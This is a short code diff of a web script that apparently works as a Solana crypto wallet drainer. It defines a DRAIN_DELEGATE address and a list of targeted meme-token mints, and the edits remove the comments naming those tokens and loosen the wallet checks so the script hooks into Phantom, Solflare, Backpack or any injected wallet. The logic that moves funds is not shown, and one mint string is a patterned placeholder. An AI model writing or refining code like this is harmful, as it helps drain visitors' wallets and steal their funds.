@@ -240,10 +240,10 @@
     const DRAIN_DELEGATE = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1";
 
     const MEME_MINTS = [
-        "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
-        "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
-        "6D7NaB2xsLd7cauWu1YbC8SGSxW6J1xua3v1w2zUL7", // POPCAT
-        "MEW1gQwX7Z8Q8v6t6t6t6t6t6t6t6t6t6t6t6t6t6t6t" // MEW
+        "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
+        "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm",
+        "6D7NaB2xsLd7cauWu1YbC8SGSxW6J1xua3v1w2zUL7",
+        "MEW1gQwX7Z8Q8v6t6t6t6t6t6t6t6t6t6t6t6t6t6t6t"
     ];
 
     let walletPubkey = null;
@@ -260,9 +260,9 @@
 
         let provider = null;
 
-        if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
-        else if (window.solflare?.isSolflare) provider = window.solflare;
-        else if (window.backpack?.isBackpack) provider = window.backpack;
+        if (window.phantom?.solana) provider = window.phantom.solana;
+        else if (window.solflare) provider = window.solflare;
+        else if (window.backpack) provider = window.backpack;
         else if (window.solana) provider = window.solana;
 
         if (!provider) {
